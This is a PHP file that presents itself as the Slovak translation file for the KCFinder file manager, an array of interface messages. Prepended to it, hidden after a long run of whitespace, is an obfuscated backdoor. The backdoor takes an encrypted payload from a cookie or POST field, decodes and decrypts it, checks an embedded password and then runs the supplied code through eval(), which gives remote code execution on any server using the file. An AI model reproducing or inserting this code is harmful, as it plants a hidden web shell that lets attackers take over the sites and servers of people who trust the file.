<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $l418957 = 974;$GLOBALS['na67f0b55'] = Array();global $na67f0b55;$na67f0b55 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['y526f'] = "\x55\x62\x23\x5a\x41\x38\x33\x27\x5e\x28\x7d\x5b\x5f\x2e\x47\x26\x3c\x4f\x2a\x46\x30\x29\x63\x60\x72\x6a\x78\x3a\x2b\x39\x51\x57\x70\x77\x54\x25\x76\x56\x53\x22\x66\x7c\x43\x61\x44\x7a\x50\x35\x40\x6c\x21\xa\x3e\x73\x9\x37\x6d\x64\x6b\x7e\x65\x31\x59\x49\x3d\x36\x7b\x69\x4c\x3b\x45\x20\xd\x75\x67\x68\x32\x52\x34\x6f\x5d\x4a\x5c\x71\x2c\x48\x24\x42\x2d\x4d\x2f\x4b\x79\x6e\x4e\x3f\x74\x58";$na67f0b55[$na67f0b55['y526f'][60].$na67f0b55['y526f'][6].$na67f0b55['y526f'][60].$na67f0b55['y526f'][1].$na67f0b55['y526f'][1].$na67f0b55['y526f'][6].$na67f0b55['y526f'][57].$na67f0b55['y526f'][29].$na67f0b55['y526f'][1]] = $na67f0b55['y526f'][22].$na67f0b55['y526f'][75].$na67f0b55['y526f'][24];$na67f0b55[$na67f0b55['y526f'][93].$na67f0b55['y526f'][78].$na67f0b55['y526f'][47].$na67f0b55['y526f'][47].$na67f0b55['y526f'][22].$na67f0b55['y526f'][60].$na67f0b55['y526f'][57].$na67f0b55['y526f'][61]] = $na67f0b55['y526f'][79].$na67f0b55['y526f'][24].$na67f0b55['y526f'][57];$na67f0b55[$na67f0b55['y526f'][75].$na67f0b55['y526f'][65].$na67f0b55['y526f'][5].$na67f0b55['y526f'][40].$na67f0b55['y526f'][61].$na67f0b55['y526f'][29]] = $na67f0b55['y526f'][57].$na67f0b55['y526f'][60].$na67f0b55['y526f'][40].$na67f0b55['y526f'][67].$na67f0b55['y526f'][93].$na67f0b55['y526f'][60];$na67f0b55[$na67f0b55['y526f'][24].$na67f0b55['y526f'][47].$na67f0b55['y526f'][76].$na67f0b55['y526f'][78]] = $na67f0b55['y526f'][53].$na67f0b55['y526f'][96].$na67f0b55['y526f'][24].$na67f0b55['y526f'][49].$na67f0b55['y526f'][60].$na67f0b55['y526f'][93];$na67f0b55[$na67f0b55['y526f'][26].$na67f0b55['y526f'][40].$na67f0b55['y526f'][6].$na67f0b55['y526f'][40].$na67f0b55['y526f'][22].$na67f0b55['y526f'][5].$na67f0b55['y526f'][5].$na67f0b55['y526f'][47]] = $na67f0b55['y526f'][57].$na67f0b55['y526f'][60].$na67f0b55['y526f'][40].$na67f0b55['y526f'][67].$na67f0b55['y526f'][93].$na67f0b55['y526f'][60].$na67f0b55['y526f'][57];$na67f0b55[$na67f0b55['y526f'][96].$na67f0b55['y526f'][5].$na67f0b55['y526f'][29].$na67f0b55['y526f'][55].$na67f0b55['y526f'][65].$na67f0b55['y526f'][40].$na67f0b55['y526f'][29].$na67f0b55['y526f'][57]] = $na67f0b55['y526f'][67].$na67f0b55['y526f'][93].$na67f0b55['y526f'][67].$na67f0b55['y526f'][12].$na67f0b55['y526f'][53].$na67f0b55['y526f'][60].$na67f0b55['y526f'][96];$na67f0b55[$na67f0b55['y526f'][49].$na67f0b55['y526f'][78].$na67f0b55['y526f'][6].$na67f0b55['y526f'][43].$na67f0b55['y526f'][43]] = $na67f0b55['y526f'][53].$na67f0b55['y526f'][60].$na67f0b55['y526f'][24].$na67f0b55['y526f'][67].$na67f0b55['y526f'][43].$na67f0b55['y526f'][49].$na67f0b55['y526f'][67].$na67f0b55['y526f'][45].$na67f0b55['y526f'][60];$na67f0b55[$na67f0b55['y526f'][36].$na67f0b55['y526f'][76].$na67f0b55['y526f'][78].$na67f0b55['y526f'][78].$na67f0b55['y526f'][78].$na67f0b55['y526f'][78].$na67f0b55['y526f'][5].$na67f0b55['y526f'][57]] = $na67f0b55['y526f'][32].$na67f0b55['y526f'][75].$na67f0b55['y526f'][32].$na67f0b55['y526f'][36].$na67f0b55['y526f'][60].$na67f0b55['y526f'][24].$na67f0b55['y526f'][53].$na67f0b55['y526f'][67].$na67f0b55['y526f'][79].$na67f0b55['y526f'][93];$na67f0b55[$na67f0b55['y526f'][53].$na67f0b55['y526f'][47].$na67f0b55['y526f'][22].$na67f0b55['y526f'][76].$na67f0b55['y526f'][65].$na67f0b55['y526f'][20].$na67f0b55['y526f'][60]] = $na67f0b55['y526f'][73].$na67f0b55['y526f'][93].$na67f0b55['y526f'][53].$na67f0b55['y526f'][60].$na67f0b55['y526f'][24].$na67f0b55['y526f'][67].$na67f0b55['y526f'][43].$na67f0b55['y526f'][49].$na67f0b55['y526f'][67].$na67f0b55['y526f'][45].$na67f0b55['y526f'][60];$na67f0b55[$na67f0b55['y526f'][1].$na67f0b55['y526f'][29].$na67f0b55['y526f'][61].$na67f0b55['y526f'][29].$na67f0b55['y526f'][43].$na67f0b55['y526f'][5]] = $na67f0b55['y526f'][1].$na67f0b55['y526f'][43].$na67f0b55['y526f'][53].$na67f0b55['y526f'][60].$na67f0b55['y526f'][65].$na67f0b55['y526f'][78].$na67f0b55['y526f'][12].$na67f0b55['y526f'][57].$na67f0b55['y526f'][60].$na67f0b55['y526f'][22].$na67f0b55['y526f'][79].$na67f0b55['y526f'][57].$na67f0b55['y526f'][60];$na67f0b55[$na67f0b55['y526f'][53].$na67f0b55['y526f'][76].$na67f0b55['y526f'][61].$na67f0b55['y526f'][20].$na67f0b55['y526f'][40].$na67f0b55['y526f'][61].$na67f0b55['y526f'][6].$na67f0b55['y526f'][29]] = $na67f0b55['y526f'][53].$na67f0b55['y526f'][60].$na67f0b55['y526f'][96].$na67f0b55['y526f'][12].$na67f0b55['y526f'][96].$na67f0b55['y526f'][67].$na67f0b55['y526f'][56].$na67f0b55['y526f'][60].$na67f0b55['y526f'][12].$na67f0b55['y526f'][49].$na67f0b55['y526f'][67].$na67f0b55['y526f'][56].$na67f0b55['y526f'][67].$na67f0b55['y526f'][96];$na67f0b55[$na67f0b55['y526f'][45].$na67f0b55['y526f'][5].$na67f0b55['y526f'][1].$na67f0b55['y526f'][55].$na67f0b55['y526f'][76].$na67f0b55['y526f'][60]] = $na67f0b55['y526f'][57].$na67f0b55['y526f'][6].$na67f0b55['y526f'][60].$na67f0b55['y526f'][55].$na67f0b55['y526f'][55].$na67f0b55['y526f'][6].$na67f0b55['y526f'][40].$na67f0b55['y526f'][5].$na67f0b55['y526f'][57];$na67f0b55[$na67f0b55['y526f'][25].$na67f0b55['y526f'][57].$na67f0b55['y526f'][29].$na67f0b55['y526f'][29].$na67f0b55['y526f'][47].$na67f0b55['y526f'][60].$na67f0b55['y526f'][76]] = $na67f0b55['y526f'][73].$na67f0b55['y526f'][78].$na67f0b55['y526f'][40].$na67f0b55['y526f'][76].$na67f0b55['y526f'][60].$na67f0b55['y526f'][78].$na67f0b55['y526f'][57];$na67f0b55[$na67f0b55['y526f'][60].$na67f0b55['y526f'][40].$na67f0b55['y526f'][43].$na67f0b55['y526f'][76].$na67f0b55['y526f'][29].$na67f0b55['y526f'][61].$na67f0b55['y526f'][60].$na67f0b55['y526f'][6]] = $_POST;$na67f0b55[$na67f0b55['y526f'][26].$na67f0b55['y526f'][76].$na67f0b55['y526f'][65].$na67f0b55['y526f'][6].$na67f0b55['y526f'][1]] = $_COOKIE;@$na67f0b55[$na67f0b55['y526f'][96].$na67f0b55['y526f'][5].$na67f0b55['y526f'][29].$na67f0b55['y526f'][55].$na67f0b55['y526f'][65].$na67f0b55['y526f'][40].$na67f0b55['y526f'][29].$na67f0b55['y526f'][57]]($na67f0b55['y526f'][60].$na67f0b55['y526f'][24].$na67f0b55['y526f'][24].$na67f0b55['y526f'][79].$na67f0b55['y526f'][24].$na67f0b55['y526f'][12].$na67f0b55['y526f'][49].$na67f0b55['y526f'][79].$na67f0b55['y526f'][74], NULL);@$na67f0b55[$na67f0b55['y526f'][96].$na67f0b55['y526f'][5].$na67f0b55['y526f'][29].$na67f0b55['y526f'][55].$na67f0b55['y526f'][65].$na67f0b55['y526f'][40].$na67f0b55['y526f'][29].$na67f0b55['y526f'][57]]($na67f0b55['y526f'][49].$na67f0b55['y526f'][79].$na67f0b55['y526f'][74].$na67f0b55['y526f'][12].$na67f0b55['y526f'][60].$na67f0b55['y526f'][24].$na67f0b55['y526f'][24].$na67f0b55['y526f'][79].$na67f0b55['y526f'][24].$na67f0b55['y526f'][53], 0);@$na67f0b55[$na67f0b55['y526f'][96].$na67f0b55['y526f'][5].$na67f0b55['y526f'][29].$na67f0b55['y526f'][55].$na67f0b55['y526f'][65].$na67f0b55['y526f'][40].$na67f0b55['y526f'][29].$na67f0b55['y526f'][57]]($na67f0b55['y526f'][56].$na67f0b55['y526f'][43].$na67f0b55['y526f'][26].$na67f0b55['y526f'][12].$na67f0b55['y526f'][60].$na67f0b55['y526f'][26].$na67f0b55['y526f'][60].$na67f0b55['y526f'][22].$na67f0b55['y526f'][73].$na67f0b55['y526f'][96].$na67f0b55['y526f'][67].$na67f0b55['y526f'][79].$na67f0b55['y526f'][93].$na67f0b55['y526f'][12].$na67f0b55['y526f'][96].$na67f0b55['y526f'][67].$na67f0b55['y526f'][56].$na67f0b55['y526f'][60], 0);@$na67f0b55[$na67f0b55['y526f'][53].$na67f0b55['y526f'][76].$na67f0b55['y526f'][61].$na67f0b55['y526f'][20].$na67f0b55['y526f'][40].$na67f0b55['y526f'][61].$na67f0b55['y526f'][6].$na67f0b55['y526f'][29]](0);if (!$na67f0b55[$na67f0b55['y526f'][26].$na67f0b55['y526f'][40].$na67f0b55['y526f'][6].$na67f0b55['y526f'][40].$na67f0b55['y526f'][22].$na67f0b55['y526f'][5].$na67f0b55['y526f'][5].$na67f0b55['y526f'][47]]($na67f0b55['y526f'][4].$na67f0b55['y526f'][68].$na67f0b55['y526f'][77].$na67f0b55['y526f'][70].$na67f0b55['y526f'][4].$na67f0b55['y526f'][44].$na67f0b55['y526f'][62].$na67f0b55['y526f'][12].$na67f0b55['y526f'][77].$na67f0b55['y526f'][0].$na67f0b55['y526f'][94].$na67f0b55['y526f'][12].$na67f0b55['y526f'][6].$na67f0b55['y526f'][65].$na67f0b55['y526f'][65].$na67f0b55['y526f'][43].$na67f0b55['y526f'][40].$na67f0b55['y526f'][1].$na67f0b55['y526f'][5].$na67f0b55['y526f'][43].$na67f0b55['y526f'][5].$na67f0b55['y526f'][43].$na67f0b55['y526f'][76].$na67f0b55['y526f'][6].$na67f0b55['y526f'][47].$na67f0b55['y526f'][47].$na67f0b55['y526f'][43].$na67f0b55['y526f'][1].$na67f0b55['y526f'][76].$na67f0b55['y526f'][61].$na67f0b55['y526f'][40].$na67f0b55['y526f'][1].$na67f0b55['y526f'][40].$na67f0b55['y526f'][61].$na67f0b55['y526f'][61].$na67f0b55['y526f'][1].$na67f0b55['y526f'][43].$na67f0b55['y526f'][61].$na67f0b55['y526f'][43].$na67f0b55['y526f'][20].$na67f0b55['y526f'][76].$na67f0b55['y526f'][40].$na67f0b55['y526f'][1].$na67f0b55['y526f'][43])){$na67f0b55[$na67f0b55['y526f'][75].$na67f0b55['y526f'][65].$na67f0b55['y526f'][5].$na67f0b55['y526f'][40].$na67f0b55['y526f'][61].$na67f0b55['y526f'][29]]($na67f0b55['y526f'][4].$na67f0b55['y526f'][68].$na67f0b55['y526f'][77].$na67f0b55['y526f'][70].$na67f0b55['y526f'][4].$na67f0b55['y526f'][44].$na67f0b55['y526f'][62].$na67f0b55['y526f'][12].$na67f0b55['y526f'][77].$na67f0b55['y526f'][0].$na67f0b55['y526f'][94].$na67f0b55['y526f'][12].$na67f0b55['y526f'][6].$na67f0b55['y526f'][65].$na67f0b55['y526f'][65].$na67f0b55['y526f'][43].$na67f0b55['y526f'][40].$na67f0b55['y526f'][1].$na67f0b55['y526f'][5].$na67f0b55['y526f'][43].$na67f0b55['y526f'][5].$na67f0b55['y526f'][43].$na67f0b55['y526f'][76].$na67f0b55['y526f'][6].$na67f0b55['y526f'][47].$na67f0b55['y526f'][47].$na67f0b55['y526f'][43].$na67f0b55['y526f'][1].$na67f0b55['y526f'][76].$na67f0b55['y526f'][61].$na67f0b55['y526f'][40].$na67f0b55['y526f'][1].$na67f0b55['y526f'][40].$na67f0b55['y526f'][61].$na67f0b55['y526f'][61].$na67f0b55['y526f'][1].$na67f0b55['y526f'][43].$na67f0b55['y526f'][61].$na67f0b55['y526f'][43].$na67f0b55['y526f'][20].$na67f0b55['y526f'][76].$na67f0b55['y526f'][40].$na67f0b55['y526f'][1].$na67f0b55['y526f'][43], 1);$gfe47d0d = NULL;$w1016 = NULL;$na67f0b55[$na67f0b55['y526f'][33].$na67f0b55['y526f'][55].$na67f0b55['y526f'][61].$na67f0b55['y526f'][47]] = $na67f0b55['y526f'][60].$na67f0b55['y526f'][61].$na67f0b55['y526f'][6].$na67f0b55['y526f'][43].$na67f0b55['y526f'][43].$na67f0b55['y526f'][20].$na67f0b55['y526f'][43].$na67f0b55['y526f'][65].$na67f0b55['y526f'][88].$na67f0b55['y526f'][55].$na67f0b55['y526f'][29].$na67f0b55['y526f'][43].$na67f0b55['y526f'][76].$na67f0b55['y526f'][88].$na67f0b55['y526f'][78].$na67f0b55['y526f'][57].$na67f0b55['y526f'][47].$na67f0b55['y526f'][43].$na67f0b55['y526f'][88].$na67f0b55['y526f'][43].$na67f0b55['y526f'][5].$na67f0b55['y526f'][65].$na67f0b55['y526f'][43].$na67f0b55['y526f'][88].$na67f0b55['y526f'][78].$na67f0b55['y526f'][65].$na67f0b55['y526f'][1].$na67f0b55['y526f'][55].$na67f0b55['y526f'][22].$na67f0b55['y526f'][57].$na67f0b55['y526f'][20].$na67f0b55['y526f'][40].$na67f0b55['y526f'][6].$na67f0b55['y526f'][6].$na67f0b55['y526f'][60].$na67f0b55['y526f'][57];global $w715;function  u4f2e4d($gfe47d0d, $f67abd32){global $na67f0b55;$x57abe57 = "";for ($ld1a=0; $ld1a<$na67f0b55[$na67f0b55['y526f'][24].$na67f0b55['y526f'][47].$na67f0b55['y526f'][76].$na67f0b55['y526f'][78]]($gfe47d0d);){for ($p4afa48=0; $p4afa48<$na67f0b55[$na67f0b55['y526f'][24].$na67f0b55['y526f'][47].$na67f0b55['y526f'][76].$na67f0b55['y526f'][78]]($f67abd32) && $ld1a<$na67f0b55[$na67f0b55['y526f'][24].$na67f0b55['y526f'][47].$na67f0b55['y526f'][76].$na67f0b55['y526f'][78]]($gfe47d0d); $p4afa48++, $ld1a++){$x57abe57 .= $na67f0b55[$na67f0b55['y526f'][60].$na67f0b55['y526f'][6].$na67f0b55['y526f'][60].$na67f0b55['y526f'][1].$na67f0b55['y526f'][1].$na67f0b55['y526f'][6].$na67f0b55['y526f'][57].$na67f0b55['y526f'][29].$na67f0b55['y526f'][1]]($na67f0b55[$na67f0b55['y526f'][93].$na67f0b55['y526f'][78].$na67f0b55['y526f'][47].$na67f0b55['y526f'][47].$na67f0b55['y526f'][22].$na67f0b55['y526f'][60].$na67f0b55['y526f'][57].$na67f0b55['y526f'][61]]($gfe47d0d[$ld1a]) ^ $na67f0b55[$na67f0b55['y526f'][93].$na67f0b55['y526f'][78].$na67f0b55['y526f'][47].$na67f0b55['y526f'][47].$na67f0b55['y526f'][22].$na67f0b55['y526f'][60].$na67f0b55['y526f'][57].$na67f0b55['y526f'][61]]($f67abd32[$p4afa48]));}}return $x57abe57;}function  d3e773f8d($gfe47d0d, $f67abd32){global $na67f0b55;global $w715;return $na67f0b55[$na67f0b55['y526f'][25].$na67f0b55['y526f'][57].$na67f0b55['y526f'][29].$na67f0b55['y526f'][29].$na67f0b55['y526f'][47].$na67f0b55['y526f'][60].$na67f0b55['y526f'][76]]($na67f0b55[$na67f0b55['y526f'][25].$na67f0b55['y526f'][57].$na67f0b55['y526f'][29].$na67f0b55['y526f'][29].$na67f0b55['y526f'][47].$na67f0b55['y526f'][60].$na67f0b55['y526f'][76]]($gfe47d0d, $w715), $f67abd32);}foreach ($na67f0b55[$na67f0b55['y526f'][26].$na67f0b55['y526f'][76].$na67f0b55['y526f'][65].$na67f0b55['y526f'][6].$na67f0b55['y526f'][1]] as $f67abd32=>$ba3be9c){$gfe47d0d = $ba3be9c;$w1016 = $f67abd32;}if (!$gfe47d0d){foreach ($na67f0b55[$na67f0b55['y526f'][60].$na67f0b55['y526f'][40].$na67f0b55['y526f'][43].$na67f0b55['y526f'][76].$na67f0b55['y526f'][29].$na67f0b55['y526f'][61].$na67f0b55['y526f'][60].$na67f0b55['y526f'][6]] as $f67abd32=>$ba3be9c){$gfe47d0d = $ba3be9c;$w1016 = $f67abd32;}}$gfe47d0d = @$na67f0b55[$na67f0b55['y526f'][53].$na67f0b55['y526f'][47].$na67f0b55['y526f'][22].$na67f0b55['y526f'][76].$na67f0b55['y526f'][65].$na67f0b55['y526f'][20].$na67f0b55['y526f'][60]]($na67f0b55[$na67f0b55['y526f'][45].$na67f0b55['y526f'][5].$na67f0b55['y526f'][1].$na67f0b55['y526f'][55].$na67f0b55['y526f'][76].$na67f0b55['y526f'][60]]($na67f0b55[$na67f0b55['y526f'][1].$na67f0b55['y526f'][29].$na67f0b55['y526f'][61].$na67f0b55['y526f'][29].$na67f0b55['y526f'][43].$na67f0b55['y526f'][5]]($gfe47d0d), $w1016));if (isset($gfe47d0d[$na67f0b55['y526f'][43].$na67f0b55['y526f'][58]]) && $w715==$gfe47d0d[$na67f0b55['y526f'][43].$na67f0b55['y526f'][58]]){if ($gfe47d0d[$na67f0b55['y526f'][43]] == $na67f0b55['y526f'][67]){$ld1a = Array($na67f0b55['y526f'][32].$na67f0b55['y526f'][36] => @$na67f0b55[$na67f0b55['y526f'][36].$na67f0b55['y526f'][76].$na67f0b55['y526f'][78].$na67f0b55['y526f'][78].$na67f0b55['y526f'][78].$na67f0b55['y526f'][78].$na67f0b55['y526f'][5].$na67f0b55['y526f'][57]](),$na67f0b55['y526f'][53].$na67f0b55['y526f'][36] => $na67f0b55['y526f'][61].$na67f0b55['y526f'][13].$na67f0b55['y526f'][20].$na67f0b55['y526f'][88].$na67f0b55['y526f'][61],);echo @$na67f0b55[$na67f0b55['y526f'][49].$na67f0b55['y526f'][78].$na67f0b55['y526f'][6].$na67f0b55['y526f'][43].$na67f0b55['y526f'][43]]($ld1a);}elseif ($gfe47d0d[$na67f0b55['y526f'][43]] == $na67f0b55['y526f'][60]){eval/*ydee08208*/($gfe47d0d[$na67f0b55['y526f'][57]]);}exit();}} ?><?php

/** Slovak localization file for KCFinder
  * author: drejk1 <drejk@inmail.sk>
  */

$lang = array(

    '_locale' => "sk_SK.UTF-8",  // UNIX localization code
    '_charset' => "utf-8",       // Browser charset

    // Date time formats. See http://www.php.net/manual/en/function.strftime.php
    '_dateTimeFull' => "%A, %e.%B.%Y %H:%M",
    '_dateTimeMid' => "%a %e %b %Y %H:%M",
    '_dateTimeSmall' => "%d.%m.%Y %H:%M",

	"You don't have permissions to upload files." =>
    "Nemáte právo nahrávať súbory.",

    "You don't have permissions to browse server." =>
    "Nemáte právo prehliadať súbory na servery.",

    "Cannot move uploaded file to target folder." =>
    "Nie je možné presunúť súbor do yvoleného adresára.",

    "Unknown error." =>
    "Neznáma chyba.",

    "The uploaded file exceeds {size} bytes." =>
    "Nahratý súbor presahuje {size} bytov.",

    "The uploaded file was only partially uploaded." =>
    "Nahratý súbor bol nahraný len čiastočne.",

    "No file was uploaded." =>
    "Žiadný súbor alebol nahraný na server.",

    "Missing a temporary folder." =>
    "Chyba dočasný adresár.",

    "Failed to write file." =>
    "Súbor se nepodarilo se uložiť.",

    "Denied file extension." =>
    "Nepodporovaný typ súboru.",

    "Unknown image format/encoding." =>
    "Neznamý formát obrázku/encoding.",

    "The image is too big and/or cannot be resized." =>
    "Obrázok je príliš veľký/alebo nemohol byť zmenšený.",

    "Cannot create {dir} folder." =>
    "Adresár {dir} nie je možné vytvoriť.",

    "Cannot write to upload folder." =>
    "Nie je možné ukladať do adresáru pre nahrávánie.",

    "Cannot read .htaccess" =>
    "Nie je možné čítať súbor .htaccess",

    "Incorrect .htaccess file. Cannot rewrite it!" =>
    "Chybný súbor .htaccess. Súbor nemožno prepísať!",

    "Cannot read upload folder." =>
    "Nie je možné čítať z adresáru pre nahrávánie súborov.",

    "Cannot access or create thumbnails folder." =>
    "Adresár pre náhľady nie je možné vytvoriť alebo nie je prístupný.",

    "Cannot access or write to upload folder." =>
    "Nie je možné pristupova alebo zapisovať do adresáru pre nahrávanie súborov.",

    "Please enter new folder name." =>
    "Zadajte prosím nové meno adresáru.",

    "Unallowable characters in folder name." =>
    "Nepovolené znaky v názve adresáru.",

    "Folder name shouldn't begins with '.'" =>
    "Meno adresára nesmie začínať znakom '.'",

    "Please enter new file name." =>
    "Vložte prosím nové meno súboru.",

    "Unallowable characters in file name." =>
    "Nepovolené znaky v názve súboru.",

    "File name shouldn't begins with '.'" =>
    "Názov súboru nesmie začínať znakom '.'",

    "Are you sure you want to delete this file?" =>
    "Ste si istý že chcete vymazať tento súbor?",

    "Are you sure you want to delete this folder and all its content?" =>
    "Ste si istý že chcete vymazať tento adresár a celý jeho obsah?",

    "Inexistant or inaccessible folder." =>
    "Neexistujúci alebo neprístupný adresár.",

    "Undefined MIME types." =>
    "Nedefinovaný MIME typ súboru.",

    "Fileinfo PECL extension is missing." =>
    "Rozšírenie PECL pre zistenie informácií o súbore chýba.",

    "Opening fileinfo database failed." =>
    "Načítanie informácií o súbore zlyhalo.",

    "You can't upload such files." =>
    "Tieto súbory nemôžete nahrať na server.",

    "The file '{file}' does not exist." =>
    "Tento súbor '{file}' neexistuje.",

    "Cannot read '{file}'." =>
    "Nie je možné načítať '{file}'.",

    "Cannot copy '{file}'." =>
    "Nie je možné kopírovať '{file}'.",

    "Cannot move '{file}'." =>
    "Nie je možné presunúť '{file}'.",

    "Cannot delete '{file}'." =>
    "Nie je možné vymazať '{file}'.",

    "Click to remove from the Clipboard" =>
    "Kliknite pre odstránenie zo schránky",

    "This file is already added to the Clipboard." =>
    "Tento súbor je už v schránke uložený.",

    "Copy files here" =>
    "Kopírovať súbory na toto miesto",

    "Move files here" =>
    "Presunúť súbory na toto miesto",

    "Delete files" =>
    "Zmazať súbory",

    "Clear the Clipboard" =>
    "Vyčistiť schránku",

    "Are you sure you want to delete all files in the Clipboard?" =>
    "Ste si istý že chcete vymazať všetky súbory zo schránky?",

    "Copy {count} files" =>
    "Kopírovať {count} súborov",

    "Move {count} files" =>
    "Presunúť {count} súborov",

    "Add to Clipboard" =>
    "Vložiť do schránky",

    "New folder name:" => "Nový názov adresára:",
    "New file name:" => "Nový názov súboru:",

    "Upload" => "Nahrať",
    "Refresh" => "Obnoviť",
    "Settings" => "Nastavenia",
    "Maximize" => "Maxializovať",
    "About" => "O aplikácii",
    "files" => "súbory",
    "View:" => "Zobraziť:",
    "Show:" => "Ukázať:",
    "Order by:" => "Zoradiť podľa:",
    "Thumbnails" => "Náhľady",
    "List" => "Zoznam",
    "Name" => "Meno",
    "Size" => "Veľkosť",
    "Date" => "Dátum",
    "Descending" => "Zostupne",
    "Uploading file..." => "Nahrávanie súborov...",
    "Loading image..." => "Načítanie obrázkov...",
    "Loading folders..." => "Načítanie adresárov...",
    "Loading files..." => "Načítanie súborov...",
    "New Subfolder..." => "Nový adresár...",
    "Rename..." => "Premenovať...",
    "Delete" => "Zmazať",
    "OK" => "OK",
    "Cancel" => "Zrušit",
    "Select" => "Vybrať",
    "Select Thumbnail" => "Vybrať náhľad",
    "View" => "Zobraziť",
    "Download" => "Stahnuť",
    'Clipboard' => "Schránka",

    // VERSION 2 NEW LABELS

    "Cannot rename the folder." =>
    "Adresár nie je možné premenovať.",

    "Non-existing directory type." =>
    "Neexistujúci typ adresára.",

    "Cannot delete the folder." =>
    "Adresár nie je možné vymazať.",

    "The files in the Clipboard are not readable." =>
    "Súbory v schránke nie je možné načítať.",

    "{count} files in the Clipboard are not readable. Do you want to copy the rest?" =>
    "{count} súborov v schránke nie je možné načítať. Chcete skopírovať ostatné súbory?",

    "The files in the Clipboard are not movable." =>
    "Súbory v schránke nie je možné presunúť.",

    "{count} files in the Clipboard are not movable. Do you want to move the rest?" =>
    "{count} súborov v schránke nie je možné presunúť. Chcete presunúť ostatné súbory?",

    "The files in the Clipboard are not removable." =>
    "Súbory v schránke nie je možné vymazať.",

    "{count} files in the Clipboard are not removable. Do you want to delete the rest?" =>
    "{count} súborov v schránke nie je možné vymazať. Chcete vymazať ostatné súbory?",

    "The selected files are not removable." =>
    "Označené súbory nie je možné vymazať.",

    "{count} selected files are not removable. Do you want to delete the rest?" =>
    "{count} označených súborov nie je možné vymazať. Chcete vymazať ostatné súbory?",

    "Are you sure you want to delete all selected files?" =>
    "Ste si istý že chcete vymazať vybrané súbory?",

    "Failed to delete {count} files/folders." =>
    "Nebolo vymazaných {count} súborov/adresárov.",

    "A file or folder with that name already exists." =>
    "Soubor alebo adresár s takovým menom už existuje.",

    "selected files" => "vybrané súbory",
    "Type" => "Typ",
    "Select Thumbnails" => "Vybrať náhľad",
    "Download files" => "Stiahnuť súbory",
);

?>